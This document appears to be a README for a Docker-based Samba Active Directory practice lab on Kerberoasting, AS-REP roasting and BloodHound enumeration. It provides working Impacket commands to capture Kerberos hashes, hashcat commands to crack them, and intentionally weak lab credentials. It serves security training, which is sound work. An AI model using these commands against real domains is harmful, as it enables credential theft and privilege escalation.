# Active Directory Samba DC: Kerberos & AD Attacks Lab

## Overview

A lightweight containerized **Samba 4 Active Directory Domain Controller (AD DC)** complete with an active Kerberos Key Distribution Center (KDC), LDAP directory services, and SMB shares. Practice fundamental enterprise Active Directory attack vectors—including **Kerberoasting**, **AS-REP Roasting**, and **BloodHound graph enumeration**—without requiring resource-intensive Windows Server virtual machines.

- **Domain**: `LAB.LOCAL`
- **Realm**: `LAB.LOCAL`
- **Default Ports**:
  - Kerberos KDC: Port `88` (TCP/UDP)
  - LDAP: Port `389` (TCP/UDP)
  - SMB: Port `445`
  - Kerberos kpasswd: Port `464`
  - LDAPS: Port `636`
- **Directory**: `Classes/04_network_penetration_tester/active_directory_samba_kerberos`

---

## AD Attack Vectors & Mechanics

```
   [ Unauthenticated Attacker ]
               |
               | 1. AS-REQ (No Pre-Auth Required)
               v
   +-----------------------+
   |   Kerberos KDC (88)   | ---> 2. Returns AS-REP encrypted with user password hash
   +-----------------------+      [AS-REP Roasting: Hashcat Mode 18200]
               |
               | 3. Authenticated as Domain User (TGT obtained)
               | 4. TGS-REQ for Service Principal Name (SPN: MSSQLSvc/...)
               v
   +-----------------------+
   |   Kerberos KDC (88)   | ---> 5. Returns TGS Ticket encrypted with service password
   +-----------------------+      [Kerberoasting: Hashcat Mode 13100]
```

1. **AS-REP Roasting (T1558.004)**:
   - When an account has `DONT_REQ_PREAUTH` (UserAccountControl bit `0x400000`), anyone can request an Authentication Service Ticket (AS-REP) for that username without knowing their password.
   - The returned AS-REP contains an encrypted timestamp using the user's password hash. Attackers extract this blob and crack it offline with Hashcat (`-m 18200`) or John the Ripper.
2. **Kerberoasting (T1558.003)**:
   - Any valid domain user can request a Ticket Granting Service (TGS) ticket for any account registered with a Service Principal Name (SPN).
   - The TGS ticket is encrypted with the service account's NTLM password hash. Attackers request the ticket, dump the encrypted payload (`$krb5tgs$23$*`), and crack it offline with Hashcat (`-m 13100`).
3. **BloodHound Graph Analysis**:
   - Ingests Active Directory entities (Users, Computers, Groups, OUs, GPOs, ACLs) and maps attack paths, privilege escalation chains, and lateral movement routes to Domain Admin.

---

## How to Solve & Practice

### 1. Start the Samba AD DC

```bash
docker compose up -d
```

### 2. Provision Target Accounts

Run the automated account provisioning script to populate the directory with realistic vulnerable users and SPNs:

```bash
./setup_vulnerable_ad.sh
```

This generates:

- **Standard User**: `bob` / `Summer2024!`
- **Kerberoastable Account**: `svc_mssql` with SPN `MSSQLSvc/db01.lab.local:1433`
- **AS-REP Roastable Account**: `svc_backup` (Pre-Authentication disabled)

### 3. AS-REP Roasting with Impacket

From your host (using `impacket` or Kali Linux):

```bash
# Query AS-REP for accounts with pre-auth disabled
GetNPUsers.py lab.local/ -usersfile <(echo -e "svc_backup\nbob\nadministrator") -format hashcat -outputfile asrep.hashes -dc-ip 127.0.0.1

# Inspect captured hash
cat asrep.hashes

# Crack hash offline with Hashcat (mode 18200)
hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
```

### 4. Kerberoasting with Impacket

Using standard user credentials (`bob:Summer2024!`), request service tickets for registered SPNs:

```bash
# Query SPNs and request TGS ticket
GetUserSPNs.py lab.local/bob:Summer2024! -dc-ip 127.0.0.1 -request -outputfile kerberoast.hashes

# Inspect captured hash ($krb5tgs$23$*...)
cat kerberoast.hashes

# Crack hash offline with Hashcat (mode 13100)
hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt
```

### 5. BloodHound Enumeration in Docker

Collect active directory objects and ACL relationships using `bloodhound-python`:

```bash
# Collect domain data
bloodhound-python -u bob -p 'Summer2024!' -d lab.local -ns 127.0.0.1 -c All --zip

# BloodHound output will generate a zip archive with JSON files:
# (users.json, groups.json, computers.json, domains.json)
```

Upload the zip file into BloodHound GUI to visualize shortest paths to Domain Admin.

---

## YouTube Walkthroughs & Solving Guides

- [m0rn1ngstr - Kerberos Attacks Explained: User Enumeration, Kerberoasting and AS-REP Roasting](https://www.youtube.com/watch?v=U1nMgb8AEB4)
- [HackerSploit - Active Directory Enumeration With BloodHound](https://www.youtube.com/watch?v=sGO4F23Xik4)
- [Motasem Hamdan - Kerberos Attacks in Windows Active Directory | TryHackMe Attacking Kerberos](https://www.youtube.com/watch?v=ErWhWBdDwTU)
- [The Cyber Mentor - Zero to Hero: Episode 10 - Kerberoasting & Active Directory Attacks](https://www.youtube.com/watch?v=6rZddmB0fug)

---

## Quick CLI Control

From the `cyber_lab` root directory:

```bash
# Check status
./lab status

# Stop this lab
docker compose down
```
